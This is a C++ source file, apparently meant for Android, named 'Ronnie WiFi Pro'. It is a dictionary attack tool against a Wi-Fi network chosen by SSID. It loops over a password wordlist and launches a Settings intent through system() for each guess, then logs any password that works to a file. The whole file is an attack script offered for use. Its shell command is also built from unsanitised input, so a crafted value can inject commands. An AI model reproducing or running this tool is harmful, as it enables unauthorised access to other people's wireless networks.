#include <iostream>
#include <string>
#include <fstream>
#include <unistd.h>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

int main() {
    system("clear");
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "      RONNIE WIFI PRO (NON-ROOT MODE)      " << endl;
    cout << "===========================================" << RESET << endl;

    // बिना रूट के स्कैनिंग संभव नहीं है, इसलिए यूजर को मैन्युअली नाम डालना होगा
    cout << YELLOW << "[!] Note: Non-Root mode me manual SSID jaruri hai." << RESET << endl;

    string ssid, wordlist;
    cout << CYAN << "\nEnter Target SSID: " << RESET;
    if (!(cin >> ws)) return 0;
    getline(cin, ssid);

    cout << CYAN << "Wordlist Path (e.g. /sdcard/pass.txt): " << RESET;
    if (!(cin >> ws)) return 0;
    getline(cin, wordlist);

    ifstream file(wordlist.c_str());
    if (!file.is_open()) {
        cout << RED << "[-] Error: Wordlist file nahi mili!" << RESET << endl;
        return 1;
    }

    string pass;
    int line_count = 0;

    cout << YELLOW << "\n[!] Starting Attack... Har try ke baad WiFi settings khulegi." << RESET << endl;
    cout << RED << "[!] Non-Root me aapko manually 'Connect' par click karna pad sakta hai." << RESET << endl;

    while (getline(file, pass)) {
        line_count++;
        if (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n')) pass.pop_back();
        if (pass.length() < 8) continue;

        cout << CYAN << "[" << line_count << "] TRYING: " << pass << RESET << endl;

        /* 
           बिना रूट के हम Intent का उपयोग करके वाई-फाई सेटअप स्क्रीन भेज सकते हैं।
           यह कमांड एंड्रॉइड को उस SSID और पासवर्ड के साथ जोड़ने का निर्देश देती है।
        */
        string cmd = "am start -a android.intent.action.MAIN -n com.android.settings/.wifi.WriteWifiConfig --es ssid \"" + ssid + "\" --es password \"" + pass + "\" > /dev/null 2>&1";
        system(cmd.c_str());

        // यूजर को चेक करने का समय दें
        cout << YELLOW << "Check karein ki connect hua ya nahi (y/n): " << RESET;
        char choice;
        cin >> choice;

        if (choice == 'y' || choice == 'Y') {
            cout << GREEN << BOLD << "\n[+] SUCCESS! Password: " << pass << RESET << endl;
            ofstream save("found_pass.txt", ios::app);
            save << "SSID: " << ssid << " | PASS: " << pass << endl;
            save.close();
            break;
        }
    }

    file.close();
    return 0;
}
